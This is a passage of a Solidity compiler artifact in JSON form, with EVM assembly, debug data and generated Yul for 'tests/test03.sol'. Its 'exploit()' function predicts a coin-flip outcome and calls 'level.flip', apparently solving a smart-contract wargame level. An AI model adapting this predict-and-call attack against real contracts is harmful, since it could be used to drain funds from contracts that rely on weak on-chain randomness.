\"tests/test03.sol\":684:688  true */\n      0x01\n        /* \"tests/test03.sol\":676:688  side == true */\n      iszero\n      iszero\n        /* \"tests/test03.sol\":676:680  side */\n      dup2\n        /* \"tests/test03.sol\":676:688  side == true */\n      iszero\n      iszero\n      sub\n        /* \"tests/test03.sol\":672:831  if (side == true)... */\n      tag_14\n      jumpi\n        /* \"tests/test03.sol\":720:725  level */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"tests/test03.sol\":720:730  level.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"tests/test03.sol\":731:735  true */\n      0x01\n        /* \"tests/test03.sol\":720:736  level.flip(true) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      pop\n        /* \"tests/test03.sol\":672:831  if (side == true)... */\n      jump(tag_21)\n    tag_14:\n        /* \"tests/test03.sol\":799:804  level */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"tests/test03.sol\":799:809  level.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"tests/test03.sol\":810:815  false */\n      0x00\n        /* \"tests/test03.sol\":799:816  level.flip(false) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_22\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_22:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_25\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_25:\n      pop\n        /* \"tests/test03.sol\":672:831  if (side == true)... */\n    tag_21:\n        /* \"tests/test03.sol\":366:841  {... */\n      pop\n      pop\n      pop\n        /* \"tests/test03.sol\":333:841  function exploit() external ... */\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_26:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:270   */\n    tag_27:\n        /* \"#utility.yul\":138:215   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":135:136   */\n      0x00\n        /* \"#utility.yul\":128:216   */\n      mstore\n        /* \"#utility.yul\":235:239   */\n      0x11\n        /* \"#utility.yul\":232:233   */\n      0x04\n        /* \"#utility.yul\":225:240   */\n      mstore\n        /* \"#utility.yul\":259:263   */\n      0x24\n        /* \"#utility.yul\":256:257   */\n      0x00\n        /* \"#utility.yul\":249:264   */\n      revert\n        /* \"#utility.yul\":276:470   */\n    tag_8:\n        /* \"#utility.yul\":316:320   */\n      0x00\n        /* \"#utility.yul\":336:356   */\n      tag_40\n        /* \"#utility.yul\":354:355   */\n      dup3\n        /* \"#utility.yul\":336:356   */\n      tag_26\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":331:356   */\n      swap2\n      pop\n        /* \"#utility.yul\":370:390   */\n      tag_41\n        /* \"#utility.yul\":388:389   */\n      dup4\n        /* \"#utility.yul\":370:390   */\n      tag_26\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":365:390   */\n      swap3\n      pop\n        /* \"#utility.yul\":414:415   */\n      dup3\n        /* \"#utility.yul\":411:412   */\n      dup3\n        /* \"#utility.yul\":407:416   */\n      sub\n        /* \"#utility.yul\":399:416   */\n      swap1\n      pop\n        /* \"#utility.yul\":438:439   */\n      dup2\n        /* \"#utility.yul\":432:436   */\n      dup2\n        /* \"#utility.yul\":429:440   */\n      gt\n        /* \"#utility.yul\":426:463   */\n      iszero\n      tag_42\n      jumpi\n        /* \"#utility.yul\":443:461   */\n      tag_43\n      tag_27\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":426:463   */\n    tag_42:\n        /* \"#utility.yul\":276:470   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":476:656   */\n    tag_28:\n        /* \"#utility.yul\":524:601   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":521:522   */\n      0x00\n        /* \"#utility.yul\":514:602   */\n      mstore\n        /* \"#utility.yul\":621:625   */\n      0x12\n        /* \"#utility.yul\":618:619   */\n      0x04\n        /* \"#utility.yul\":611:626   */\n      mstore\n        /* \"#utility.yul\":645:649   */\n      0x24\n        /* \"#utility.yul\":642:643   */\n      0x00\n        /* \"#utility.yul\":635:650   */\n      revert\n        /* \"#utility.yul\":662:847   */\n    tag_11:\n        /* \"#utility.yul\":702:703   */\n      0x00\n        /* \"#utility.yul\":719:739   */\n      tag_46\n        /* \"#utility.yul\":737:738   */\n      dup3\n        /* \"#utility.yul\":719:739   */\n      tag_26\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":714:739   */\n      swap2\n      pop\n        /* \"#utility.yul\":753:773   */\n      tag_47\n        /* \"#utility.yul\":771:772   */\n      dup4\n        /* \"#utility.yul\":753:773   */\n      tag_26\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":748:773   */\n      swap3\n      pop\n        /* \"#utility.yul\":792:793   */\n      dup3\n        /* \"#utility.yul\":782:817   */\n      tag_48\n      jumpi\n        /* \"#utility.yul\":797:815   */\n      tag_49\n      tag_28\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":782:817   */\n    tag_48:\n        /* \"#utility.yul\":839:840   */\n      dup3\n        /* \"#utility.yul\":836:837   */\n      dup3\n        /* \"#utility.yul\":832:841   */\n      div\n        /* \"#utility.yul\":827:841   */\n      swap1\n      pop\n        /* \"#utility.yul\":662:847   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":853:943   */\n    tag_29:\n        /* \"#utility.yul\":887:894   */\n      0x00\n        /* \"#utility.yul\":930:935   */\n      dup2\n        /* \"#utility.yul\":923:936   */\n      iszero\n        /* \"#utility.yul\":916:937   */\n      iszero\n        /* \"#utility.yul\":905:937   */\n      swap1\n      pop\n        /* \"#utility.yul\":853:943   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":949:1058   */\n    tag_30:\n        /* \"#utility.yul\":1030:1051   */\n      tag_52\n        /* \"#utility.yul\":1045:1050   */\n      dup2\n        /* \"#utility.yul\":1030:1051   */\n      tag_29\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1025:1028   */\n      dup3\n        /* \"#utility.yul\":1018:1052   */\n      mstore\n        /* \"#utility.yul\":949:1058   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1064:1274   */\n    tag_16:\n        /* \"#utility.yul\":1151:1155   */\n      0x00\n        /* \"#utility.yul\":1189:1191   */\n      0x20\n        /* \"#utility.yul\":1178:1187   */\n      dup3\n        /* \"#utility.yul\":1174:1192   */\n      add\n        /* \"#utility.yul\":1166:1192   */\n      swap1\n      pop\n        /* \"#utility.yul\":1202:1267   */\n      tag_54\n        /* \"#utility.yul\":1264:1265   */\n      0x00\n        /* \"#utility.yul\":1253:1262   */\n      dup4\n        /* \"#utility.yul\":1249:1266   */\n      add\n        /* \"#utility.yul\":1240:1246   */\n      dup5\n        /* \"#utility.yul\":1202:1267   */\n      tag_30\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1064:1274   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1361:1478   */\n    tag_32:\n        /* \"#utility.yul\":1470:1471   */\n      0x00\n        /* \"#utility.yul\":1467:1468   */\n      0x00\n        /* \"#utility.yul\":1460:1472   */\n      revert\n        /* \"#utility.yul\":1607:1723   */\n    tag_34:\n        /* \"#utility.yul\":1677:1698   */\n      tag_59\n        /* \"#utility.yul\":1692:1697   */\n      dup2\n        /* \"#utility.yul\":1677:1698   */\n      tag_29\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1670:1675   */\n      dup2\n        /* \"#utility.yul\":1667:1699   */\n      eq\n        /* \"#utility.yul\":1657:1717   */\n      tag_60\n      jumpi\n        /* \"#utility.yul\":1713:1714   */\n      0x00\n        /* \"#utility.yul\":1710:1711   */\n      0x00\n        /* \"#utility.yul\":1703:1715   */\n      revert\n        /* \"#utility.yul\":1657:1717   */\n    tag_60:\n        /* \"#utility.yul\":1607:1723   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1729:1866   */\n    tag_35:\n        /* \"#utility.yul\":1783:1788   */\n      0x00\n        /* \"#utility.yul\":1814:1820   */\n      dup2\n        /* \"#utility.yul\":1808:1821   */\n      mload\n        /* \"#utility.yul\":1799:1821   */\n      swap1\n      pop\n        /* \"#utility.yul\":1830:1860   */\n      tag_62\n        /* \"#utility.yul\":1854:1859   */\n      dup2\n        /* \"#utility.yul\":1830:1860   */\n      tag_34\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":1729:1866   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1872:2217   */\n    tag_20:\n        /* \"#utility.yul\":1939:1945   */\n      0x00\n        /* \"#utility.yul\":1988:1990   */\n      0x20\n        /* \"#utility.yul\":1976:1985   */\n      dup3\n        /* \"#utility.yul\":1967:1974   */\n      dup5\n        /* \"#utility.yul\":1963:1986   */\n      sub\n        /* \"#utility.yul\":1959:1991   */\n      slt\n        /* \"#utility.yul\":1956:2075   */\n      iszero\n      tag_64\n      jumpi\n        /* \"#utility.yul\":1994:2073   */\n      tag_65\n      tag_32\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1956:2075   */\n    tag_64:\n        /* \"#utility.yul\":2114:2115   */\n      0x00\n        /* \"#utility.yul\":2139:2200   */\n      tag_66\n        /* \"#utility.yul\":2192:2199   */\n      dup5\n        /* \"#utility.yul\":2183:2189   */\n      dup3\n        /* \"#utility.yul\":2172:2181   */\n      dup6\n        /* \"#utility.yul\":2168:2190   */\n      add\n        /* \"#utility.yul\":2139:2200   */\n      tag_35\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2129:2200   */\n      swap2\n      pop\n        /* \"#utility.yul\":2085:2210   */\n      pop\n        /* \"#utility.yul\":1872:2217   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212202f488e115fc89ea40ddfe1057ebe35af5d437f9b1e55f2ea48f4f7cc0585fba764736f6c634300081c0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_104": {
									"entryPoint": null,
									"id": 104,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 229,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 249,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 190,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 159,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 155,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 207,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:1199:2",
										"nodeType": "YulBlock",
										"src": "0:1199:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:2",
													"nodeType": "YulBlock",
													"src": "47:35:2",
													"statements": [
														{
															"nativeSrc": "57:19:2",
															"nodeType": "YulAssignment",
															"src": "57:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:2",
																		"nodeType": "YulLiteral",
																		"src": "73:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:2"
																},
																"nativeSrc": "67:9:2",
																"nodeType": "YulFunctionCall",
																"src": "67:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:2",
														"nodeType": "YulTypedName",
														"src": "40:6:2",
														"type": ""
													}
												],
												"src": "7:75:2"
											},
											{
												"body": {
													"nativeSrc": "177:28:2",
													"nodeType": "YulBlock",
													"src": "177:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:2",
																		"nodeType": "YulLiteral",
																		"src": "194:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:2",
																		"nodeType": "YulLiteral",
																		"src": "197:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:2"
																},
																"nativeSrc": "187:12:2",
																"nodeType": "YulFunctionCall",
																"src": "187:12:2"
															},
															"nativeSrc": "187:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:2"
											},
											{
												"body": {
													"nativeSrc": "300:28:2",
													"nodeType": "YulBlock",
													"src": "300:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:2",
																		"nodeType": "YulLiteral",
																		"src": "317:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:2",
																		"nodeType": "YulLiteral",
																		"src": "320:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:2"
																},
																"nativeSrc": "310:12:2",
																"nodeType": "YulFunctionCall",
																"src": "310:12:2"
															},
															"nativeSrc": "310:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:2"
											},
											{
												"body": {
													"nativeSrc": "379:81:2",
													"nodeType": "YulBlock",
													"src": "379:81:2",
													"statements": [
														{
															"nativeSrc": "389:65:2",
															"nodeType": "YulAssignment",
															"src": "389:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:2",
																		"nodeType": "YulLiteral",
																		"src": "411:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:2"
																},
																"nativeSrc": "400:54:2",
																"nodeType": "YulFunctionCall",
																"src": "400:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:2",
														"nodeType": "YulTypedName",
														"src": "361:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:2",
														"nodeType": "YulTypedName",
														"src": "371:7:2",
														"type": ""
													}
												],
												"src": "334:126:2"
											},
											{
												"body": {
													"nativeSrc": "511:51:2",
													"nodeType": "YulBlock",
													"src": "511:51:2",
													"statements": [
														{
															"nativeSrc": "521:35:2",
															"nodeType": "YulAssignment",
															"src": "521:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:2"
																},
																"nativeSrc": "532:24:2",
																"nodeType": "YulFunctionCall",
																"src": "532:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:2",
														"nodeType": "YulTypedName",
														"src": "493:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:2",
														"nodeType": "YulTypedName",
														"src": "503:7:2",
														"type": ""
													}
												],
												"src": "466:96:2"
											},
											{
												"body": {
													"nativeSrc": "611:79:2",
													"nodeType": "YulBlock",
													"src": "611:79:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "668:16:2",
																"nodeType": "YulBlock",
																"src": "668:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "677:1:2",
																					"nodeType": "YulLiteral",
																					"src": "677:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "680:1:2",
																					"nodeType": "YulLiteral",
																					"src": "680:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "670:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:2"
																			},
																			"nativeSrc": "670:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:2"
																		},
																		"nativeSrc": "670:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "634:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "659:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "641:17:2",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:2"
																				},
																				"nativeSrc": "641:24:2",
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "631:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:2"
																		},
																		"nativeSrc": "631:35:2",
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "624:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:2"
																},
																"nativeSrc": "624:43:2",
																"nodeType": "YulFunctionCall",
																"src": "624:43:2"
															},
															"nativeSrc": "621:63:2",
															"nodeType": "YulIf",
															"src": "621:63:2"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "568:122:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "604:5:2",
														"nodeType": "YulTypedName",
														"src": "604:5:2",
														"type": ""
													}
												],
												"src": "568:122:2"
											},
											{
												"body": {
													"nativeSrc": "759:80:2",
													"nodeType": "YulBlock",
													"src": "759:80:2",
													"statements": [
														{
															"nativeSrc": "769:22:2",
															"nodeType": "YulAssignment",
															"src": "769:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "784:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "778:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:2"
																},
																"nativeSrc": "778:13:2",
																"nodeType": "YulFunctionCall",
																"src": "778:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "769:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "827:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "800:26:2",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:2"
																},
																"nativeSrc": "800:33:2",
																"nodeType": "YulFunctionCall",
																"src": "800:33:2"
															},
															"nativeSrc": "800:33:2",
															"nodeType": "YulExpressionStatement",
															"src": "800:33:2"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nativeSrc": "696:143:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "737:6:2",
														"nodeType": "YulTypedName",
														"src": "737:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "745:3:2",
														"nodeType": "YulTypedName",
														"src": "745:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "753:5:2",
														"nodeType": "YulTypedName",
														"src": "753:5:2",
														"type": ""
													}
												],
												"src": "696:143:2"
											},
											{
												"body": {
													"nativeSrc": "922:274:2",
													"nodeType": "YulBlock",
													"src": "922:274:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "968:83:2",
																"nodeType": "YulBlock",
																"src": "968:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "970:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "970:77:2"
																			},
																			"nativeSrc": "970:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "970:79:2"
																		},
																		"nativeSrc": "970:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "970:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "943:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "943:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "952:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "952:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "939:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "939:3:2"
																		},
																		"nativeSrc": "939:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "939:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "964:2:2",
																		"nodeType": "YulLiteral",
																		"src": "964:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "935:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:2"
																},
																"nativeSrc": "935:32:2",
																"nodeType": "YulFunctionCall",
																"src": "935:32:2"
															},
															"nativeSrc": "932:119:2",
															"nodeType": "YulIf",
															"src": "932:119:2"
														},
														{
															"nativeSrc": "1061:128:2",
															"nodeType": "YulBlock",
															"src": "1061:128:2",
															"statements": [
																{
																	"nativeSrc": "1076:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1076:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1090:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1090:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1080:6:2",
																			"nodeType": "YulTypedName",
																			"src": "1080:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1105:74:2",
																	"nodeType": "YulAssignment",
																	"src": "1105:74:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1151:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "1151:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1162:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "1162:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1147:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "1147:3:2"
																				},
																				"nativeSrc": "1147:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1147:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1171:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "1171:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nativeSrc": "1115:31:2",
																			"nodeType": "YulIdentifier",
																			"src": "1115:31:2"
																		},
																		"nativeSrc": "1115:64:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1115:64:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1105:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1105:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nativeSrc": "845:351:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "892:9:2",
														"nodeType": "YulTypedName",
														"src": "892:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "903:7:2",
														"nodeType": "YulTypedName",
														"src": "903:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "915:6:2",
														"nodeType": "YulTypedName",
														"src": "915:6:2",
														"type": ""
													}
												],
												"src": "845:351:2"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
